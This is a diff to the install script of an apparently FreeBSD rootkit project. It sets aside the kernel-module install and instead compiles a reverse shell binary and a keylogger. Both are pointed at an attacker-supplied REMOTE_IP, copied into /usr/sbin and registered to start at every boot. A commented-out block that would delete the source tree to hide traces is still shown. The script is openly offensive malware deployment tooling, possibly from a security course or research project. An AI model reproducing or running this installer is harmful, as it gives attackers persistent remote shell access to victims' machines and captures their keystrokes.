@@ -17,6 +17,8 @@
 # along with this program. If not, see <http://www.gnu.org/licenses/>.
 #
 
+REMOTE_IP=$1
+
 SRC=$(dirname "$(realpath $0)")
 
 NAME="rootkit"
@@ -24,11 +26,14 @@ KO="$NAME.ko"
 KMOD=$SRC/src/kmod
 BINARIES=$SRC/src/bin
 
-RSHELL_BIN="rshell_target"
+RSHELL="rshell_target"
 RSHELL_CONF_FILE="rshell"
-RSHELL_INSTALL="/etc/rc.d"
-RSHELL_CONF="/etc/rc.conf"
-USR_BIN="/usr/sbin"
+KEYLOG="keylog_target"
+KEYLOG_CONF_FILE="keylog"
+
+RC_INSTALL_LOCATION="/etc/rc.d/"
+RC_CONF_FILE="/etc/rc.conf"
+USR_SBIN="/usr/sbin/"
 
 
 INSTALL="/boot/modules"
@@ -44,30 +49,56 @@ EOF
 
 cd $KMOD
 
-echo ">> Clean existing build."
+# echo ">> Clean existing build."
+# make clean
+
+# echo ">> Build rootkit."
+# make
+
+# echo ">> Install rootkit kernel module."
+# mv $KMOD/$KO $INSTALL/$KO
+# kldload $INSTALL/$KO
+# echo ""$NAME"_load=\"YES\"" > $LOADER_CONF
+
+cd $BINARIES
+
+echo ">> Clean existing binary build."
 make clean
 
-echo ">> Build rootkit."
-make
+echo ">> Compile rshell binary."
+make rshell
 
-echo ">> Install rootkit kernel module."
-mv $KMOD/$KO $INSTALL/$KO
-kldload $INSTALL/$KO
-echo ""$NAME"_load=\"YES\"" > $LOADER_CONF
+echo ">> Compile keylog binary."
+make keylog
 
-echo ">> Install revershell shell for boot."
-mv $BINARIES/$RSHELL_BIN $USR_BIN/
+echo ">> Editing rshell conf file to contain REMOTE_IP=${REMOTE_IP}."
+sed -i '' "s|${USR_SBIN}${RSHELL}|${USR_SBIN}${RSHELL} ${REMOTE_IP}|g" $BINARIES/$RSHELL_CONF_FILE
 
-echo ">> Enable reverse-shell on boot."
-echo "${RSHELL_CONF_FILE}_enable=\"YES\"" >> $RSHELL_CONF
+echo ">> Editing keylog conf file to contain REMOTE_IP=${REMOTE_IP}."
+sed -i '' "s|${USR_SBIN}${KEYLOG}|${USR_SBIN}${KEYLOG} ${REMOTE_IP}|g" $BINARIES/$KEYLOG_CONF_FILE
 
-echo ">> Move configuration file into rc."
-mv $BINARIES/$RSHELL_CONF_FILE $RSHELL_INSTALL/
+echo ">> Moving reverse shell binary into /usr/sbin/ for booting."
+mv -f $BINARIES/$RSHELL $USR_SBIN
 
-if [ "$1" = "DEBUG" ]
-then
-        echo ">> Ignore source files."
-else
-	echo ">> Purge source files."
-	rm -rf $SRC
-fi
+echo ">> Moving keylog binary into /usr/sbin/ for booting."
+mv -f $BINARIES/$KEYLOG $USR_SBIN
+
+echo ">> Modify rc.conf to enable boot for rshell."
+echo "${RSHELL}_enable=\"YES\"" >> $RSHELL_CONF_FILE
+
+echo ">> Modify rc.conf to enable boot for keylog."
+echo "${KEYLOG}_enable=\"YES\"" >> $RSHELL_CONF_FILE
+
+echo ">> Move rshell configuration file into /etc/rc.d."
+mv $BINARIES/$RSHELL_CONF_FILE $RC_INSTALL_LOCATION
+
+echo ">> Move keylog configuration file into /etc/rc.d."
+mv $BINARIES/$KEYLOG_CONF_FILE $RC_INSTALL_LOCATION
+
+# if [ "$2" = "DEBUG" ]
+# then
+#         echo ">> Ignore source files."
+# else
+# 	echo ">> Purge source files."
+# 	rm -rf $SRC
+# fi
